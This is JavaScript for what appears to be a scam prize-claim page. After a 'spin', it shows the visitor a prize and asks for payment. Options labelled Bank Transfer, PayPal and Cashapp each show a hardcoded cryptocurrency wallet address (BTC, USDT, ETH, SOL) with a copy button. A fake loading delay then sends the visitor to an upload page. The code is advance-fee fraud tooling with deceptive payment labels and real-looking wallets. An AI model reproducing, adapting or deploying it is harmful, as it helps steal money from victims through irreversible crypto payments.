document.getElementById("user").innerText = localStorage.getItem('fullName');
const prize = JSON.parse(localStorage.getItem("claimedPrize"));
  if (prize) {
    document.getElementById("item").innerText = prize.name;
  } else {
    document.body.innerHTML = "<center>No prize found. Please go back to spin page.</center>";
  }

document.querySelector('#method').addEventListener('change', function(e) {
    e.preventDefault();

    document.querySelector('.payment-box').style.display = 'block';
    if(document.querySelector('#method').value === 'Bank Transfer') {
        document.querySelector('#head').innerHTML = 'BTC';
        document.querySelector('#img').src = 'img/BTC.jpeg';
        document.querySelector('#wallet').innerHTML = '1HoqvSv6U15gnKTx9vKqYeuAcSwZCMVFKi';


    } else if(document.querySelector('#method').value === 'PayPal') {
        document.querySelector('#head').innerHTML = 'USDT-TRC20';
        document.querySelector('#img').src = 'img/USDT.jpeg';
        document.querySelector('#wallet').innerHTML = 'TUoicsf8bYdDE4FEM7gCYACwCqcW5scbi2';

    } else if(document.querySelector('#method').value === 'Crypto') {
        document.querySelector('#head').innerHTML = 'ETH (ERC20)';
        document.querySelector('#img').src = 'img/ETH.jpeg';
        document.querySelector('#wallet').innerHTML = '0xbc5616a217277dac74d07a3e52fce244ed398c08';

    } else if(document.querySelector('#method').value === 'Cashapp') {
       document.querySelector('#head').innerHTML = 'SOL';
       document.querySelector('#img').src = 'img/SOL.jpeg';
        document.querySelector('#wallet').innerHTML = 'CCBLF5zHy62NXinuPpB3m6XrGvuVDkhfNyHKDesHxLQn';

    } else if(document.querySelector('#method').value === '') {
        document.querySelector('.payment-box').style.display = 'none';

    }
});

document.querySelector('#bi-copy').addEventListener('click', function(e) {
    e.preventDefault();

    const textToCopy = document.querySelector('#wallet')?.innerText || '';

    if (textToCopy) {
        navigator.clipboard.writeText(textToCopy)
            .then(() => {
                alert("Copied to clipboard!");
            })
            .catch(err => {
                console.error("Failed to copy: ", err);
                alert("Failed to copy!");
            });
    } else {
        alert("Nothing to copy.");
    }
});

document.querySelector('#btn').addEventListener('click', function(e) {
    e.preventDefault();

    document.querySelector('.loading').style.display = 'block';
    setTimeout(() => {
        document.querySelector('.loading').style.display = 'none';
        window.location.href='upload2.html';
    },3000);
})